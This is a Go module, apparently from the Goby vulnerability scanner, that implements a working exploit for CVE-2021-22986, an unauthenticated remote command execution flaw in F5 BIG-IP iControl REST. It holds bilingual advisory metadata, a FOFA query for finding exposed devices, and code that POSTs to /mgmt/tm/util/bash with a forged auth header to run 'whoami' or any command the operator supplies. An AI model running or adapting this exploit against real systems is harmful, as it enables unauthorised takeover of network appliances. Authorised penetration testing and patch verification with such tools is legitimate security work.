package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "BIG IP iControl unauth RCE (CVE-2021-22986)",
    "Description": "F5 Big-IP, an application delivery platform for F5 Corporation, issued a security bulletin today, announcing seven security vulnerabilities related to Big-IP and Big-IQ.Among them, CVE-2021-22986 is an unauthenticated remote command execution vulnerability. Due to incomplete authentication of HTTP requests, it allows attackers to bypass permission authentication and access Big-IP REST API to execute commands by setting special HTTP headers.",
    "Impact": "BIG IP iControl unauth RCE (CVE-2021-22986)",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://support.f5.com/csp/article/K03009991\">https: //support.f5.com/csp/article/K03009991</a></p>",
    "Product": "f5-BIGIP",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "F5 iControl REST远程命令执行漏洞",
            "Description": "F5 BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。BIG-IP提供了应用程序加速、负载均衡、速率调整、SSL卸载和Web应用程序防护功能。F5 iControl REST存在未授权远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。",
            "Impact": "<p>F5 BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。BIG-IP提供了应用程序加速、负载均衡、速率调整、SSL卸载和Web应用程序防护功能。</p><p>F5 iControl REST存在未授权远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://support.f5.com/csp/article/K03009991\" target=\"_blank\">https://support.f5.com/csp/article/K03009991</a><br></p>",
            "Product": "f5-BIGIP",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "BIG IP iControl unauth RCE (CVE-2021-22986)",
            "Description": "F5 Big-IP, an application delivery platform for F5 Corporation, issued a security bulletin today, announcing seven security vulnerabilities related to Big-IP and Big-IQ.Among them, CVE-2021-22986 is an unauthenticated remote command execution vulnerability. Due to incomplete authentication of HTTP requests, it allows attackers to bypass permission authentication and access Big-IP REST API to execute commands by setting special HTTP headers.",
            "Impact": "BIG IP iControl unauth RCE (CVE-2021-22986)",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://support.f5.com/csp/article/K03009991\" target=\"_blank\">https: //support.f5.com/csp/article/K03009991</a><br></p>",
            "Product": "f5-BIGIP",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "title=\"BIG-IP&reg;- Redirect\"",
    "GobyQuery": "title=\"BIG-IP&reg;- Redirect\"",
    "Author": "go0p",
    "Homepage": "https://support.f5.com",
    "DisclosureDate": "2021-03-19",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.3",
    "CVEIDs": [
        "CVE-2021-22986"
    ],
    "CNVD": [
        "CNVD-2021-16852"
    ],
    "CNNVD": [
        "CNNVD-202103-770"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "F5-BIGIP"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/mgmt/tm/util/bash")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = "{\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"}"
			cfg.Header.Store("Content-type", "application/json")
			cfg.Header.Store("X-F5-Auth-Token", "")
			cfg.Header.Store("Authorization", "Basic YWRtaW46QVNhc1M=")
			if resp1, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "kind") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/mgmt/tm/util/bash")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = fmt.Sprintf("{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}", ss.Params["cmd"].(string))
			cfg.Header.Store("Content-type", "application/json")
			cfg.Header.Store("X-F5-Auth-Token", "")
			cfg.Header.Store("Authorization", "Basic YWRtaW46QVNhc1M=")
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "kind") {
					reg := regexp.MustCompile(`(?s)"commandResult":"(.*)"}`)
					stream := reg.FindStringSubmatch(resp1.RawBody)
					expResult.Output = strings.Replace(stream[1], "\\n", "\n", -1)
					expResult.Success = true
					return expResult
				}
			}
			return expResult
		},
	))
}
